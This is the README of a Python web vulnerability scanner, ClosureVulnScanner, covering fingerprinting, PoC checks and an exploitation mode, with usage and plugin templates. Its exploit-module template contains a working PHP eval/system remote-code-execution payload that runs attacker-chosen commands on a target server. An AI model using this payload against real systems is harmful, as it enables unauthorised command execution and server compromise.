<h1 align="center">CVS - ClosureVulnScanner</h1>
<center><img src="https://socialify.git.ci/Y5neKO/ClosureVulnScanner/image?description=1&forks=1&issues=1&language=1&logo=https%3A%2F%2Fraw.githubusercontent.com%2FY5neKO%2FClosureVulnScanner%2Fmain%2Fasset%2FClosure.png&name=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Light" alt="ClosureVulnScanner" /></center>
<p align="center">
  基于Python的Web综合漏洞扫描器,名字取自<b>Arknights® Closure</b>
  <br><br>
  <a href='https://blog.ysneko.com'><img src="https://img.shields.io/static/v1?label=Powered%20by&message=Y5neKO&color=green" alt="Author"></a>
  <a href='https://www.python.org/'><img src="https://img.shields.io/static/v1?label=Python&message=3.8.0&color=yellow" alt="Python"></a>
  <br><br>
  <a href="#">
    <img src="https://img.shields.io/badge/Supported%20by-Alipay🈲%20%E2%86%92-gray.svg?colorA=655BE1&colorB=4F44D6&style=for-the-badge" alt="支付宝"/>
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Supported%20by-WechatPay🈲%20%E2%86%92-gray.svg?colorA=61c265&colorB=4CAF50&style=for-the-badge" alt="微信支付"/>
  </a>
  <br><br>
  <a>———— </a>
  <br>
  <a>———— </a>
  <br><br>
  <img src="Closure.png" alt="Closure" style="zoom:50%;" />
</p>



## CVS - ClosureVulnScanner

- **v0.0**: 目前正在开发中，广泛征求意见.
- **v0.1**: 实现了基础功能，包括指纹、exp、poc、多线程以及代理等功能.
- **v0.2**: 重构了代码结构，优化多线程算法，修复了部分bug


## 默认配置
`Python 3_8_0`  |  `PyCharm 2023.2.3`  |  `Windows 11`  |  `UTF-8`


## 版本&更新日志
**版本** v0.2

- *2023.10.26* | First init.
- *2023.11.01* | v0.1版本发布.
- *2024.02.29* | v0.2版本发布



## 快速开始

**稳定版**：

功能无异常的发布版本。

```sh
wget {请从Release下载}
cd ClosureVulnScanner
python3 -m pip install -r requirements.txt
python3 CVS.py
```

**开发版**：

主要用于作者个人编程使用的的开发版本，可能存在Bug或者因为代码未编写完而出现异常的情况

```sh
git clone https://github.com/Y5neKO/ClosureVulnScanner
cd ClosureVulnScanner
python3 -m pip install -r requirements.txt
python3 CVS.py
```



## 使用说明

```sh
root#
-> python3 CVS.py -h

    ,ad8888ba,   88
   d8"'    `"8b  88
  d8'            88
  88             88   ,adPPYba,   ,adPPYba,  88       88  8b,dPPYba,   ,adPPYba,
  88             88  a8"     "8a  I8[    ""  88       88  88P'   "Y8  a8P_____88
  Y8,            88  8b       d8   `"Y8ba,   88       88  88          8PP"
   Y8a.    .a8P  88  "8a,   ,a8"  aa    ]8I  "8a,   ,a88  88          "8b,   ,aa
    `"Y8888Y"'   88   `"YbbdP"'   `"YbbdP"'   `"YbbdP'Y8  88           `"Ybbd8"'

                                                                           v0.2 By Y5neKO :)
                                                                           扰扰马足车尘，被岁月无情，暗消年少。

欢迎使用Closure Vulnerability Scanner
Github: https://github.com/Y5neKO

usage: CVS.py [-h] [-u URL] [-e {identify,scan,exp}] [--exp EXP_NAME] [--cmd CMD] [-t TIMEOUT] [--proxy PROXY] [-o OUTPUT] [--list {poc,exp}] [--add-poc ADD_POC_NAME] [--add-exp ADD_EXP_NAME]

使用帮助

optional arguments:
  -h, --help            show this help message and exit

扫描参数:
  -u URL                目标url, example: http(s)://www.baidu.com/
  -e {identify,scan,exp}
                        指定操作类型, 默认为指纹识别。identify:指纹识别 | scan:漏洞扫描 | exp:漏洞利用
  --exp EXP_NAME        指定exp模块, 使用exp目录内插件
  --cmd CMD             指定exp模块执行的命令, 若模块不支持命令执行可缺省
  -t TIMEOUT            设置超时时间(ms), 默认5000ms
  --proxy PROXY         使用代理, 目前支持Socks,HTTP; 格式:{socks|http}://ip_addr:port
  -o OUTPUT             输出扫描结果到指定路径

拓展参数:
  --list {poc,exp}      列出已经加载的poc/exp插件
  --add-poc ADD_POC_NAME
                        添加poc插件
  --add-exp ADD_EXP_NAME
                        添加exp插件
```



## 目录及功能描述

`asset`: 静态资源目录

`core`: 核心功能目录

`exp`: 漏洞利用模块插件目录

`ez_poc`: 简单发包型poc验证模块插件目录

`finger`: 指纹信息目录

`log`: 程序日志目录

`poc`: 复杂poc验证模块插件目录



## 指纹模块编写规范

**添加方式**：

在`finger/finger.json`文件内的AssetName字段内增加即可

```json
{
  "AssetName": {}
}
```

**编写规范**：

```json
"资产名称": {
      "description": "指纹描述",
      "payload": {
        "method": "请求协议",
        "uri": "请求uri",
        "headers": {
          "头部字段1": "头部键值1"
        },
        "body": {
            "请求字段1": "请求键值1"
        }
      },
      "location": "验证关键字的位置：uri、headers、body",
      "checkhash": "目标hash校验值,默认为32位md5",
      "keywords": "验证关键字，支持正则表达式"
    }
```



## POC模块编写规范

### 简单POC模块

仅需要发包就可以验证的poc

**添加方式**：

在`ez_poc/ez_poc.json`文件内的PocName字段内增加即可

```json
{
  "PocName": {}
}
```

**编写规范**：

```json
"漏洞名称": {
      "description": "漏洞描述",
      "payload": {
        "method": "请求协议",
        "uri": "uri路径",
        "headers": {
          "头部字段1": "头部键值1"
        },
        "body": {
            "请求字段1": "请求键值1"
        }
      },
      "location": "验证关键字的位置：uri、headers、body",
      "keywords": "验证关键字，支持正则表达式"
    }
```

### 复杂POC模块

需要经过复杂逻辑才能验证的poc

**添加方式**：

将python模块文件添加到poc目录

- 文件名规范：`资产名称_漏洞名称.py`
- 执行导入命令，写入poc索引文件：`python CVS.py --add-poc {模块名，必须和模块文件保持一致}`

**编写规范**：

```python
# 需要自行导入所需要包
import XXX

# 函数定义为 run(url, timeout)
def run(url, timeout):
    """
    参数描述
    @param url: 目标地址
    @param timeout: 超时时间
    @return result: 一个包括所有返回结果的列表
    """
    result = {
        'name': '漏洞名称',
        'vulnerable': False,	# 漏洞验证成功标识
        'method': None,			# 漏洞请求协议
        'url': None,			# 验证目标地址
        'payload': None			# 验证payload
    }
    """
    自定义代码段，根据编写逻辑，赋值并返回结果即可
    """
    return result
```



## EXP模块编写规范

用于漏洞利用

将python模块文件添加到exp目录

- 文件名规范：`资产名称_漏洞名称.py`
- 执行导入命令，写入exp索引文件：`python CVS.py --add-exp {模块名，必须和模块文件保持一致}`

```python
# 需要自行导入所需要包
import XXX

# 函数定义为 run(url, cmd)
def run(url, cmd):
    """
    参数描述
    @param url: 目标地址
    @param cmd: 指定命令执行，就算无法直接执行命令，也需要定义形参
    @return {bool, string}: 执行成功标识和返回结果，用于命令回显，无回显自行说明即可；命令回显返回结果需用“{{{{{回显}}}}}”格式包裹，用于从响应中识别命令回显结果
    """
    payload = r'/index.php?s=a/b/c/${@print(eval($_POST[cmd]))}'
    payload = urllib.parse.urljoin(url, payload)
    response = requests.post(payload, data={"cmd": "echo '{{{{{';system('" + str(cmd) + "');echo '}}}}}';"})
    if response.status_code == 200:
        return True, response.text
    else:
        return False, "利用失败"
```



## 贡献者

<a href="https://github.com/Y5neKO/ClosureVulnScanner/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=Y5neKO/ClosureVulnScanner" />
</a>



## 贡献者们

[![Stargazers repo roster for @Y5neKO/ClosureVulnScanner](http://reporoster.com/stars/Y5neKO/ClosureVulnScanner)](https://github.com/Y5neKO/ClosureVulnScanner/stargazers)


## 使用许可
[MIT](LICENSE) © Y5neKO
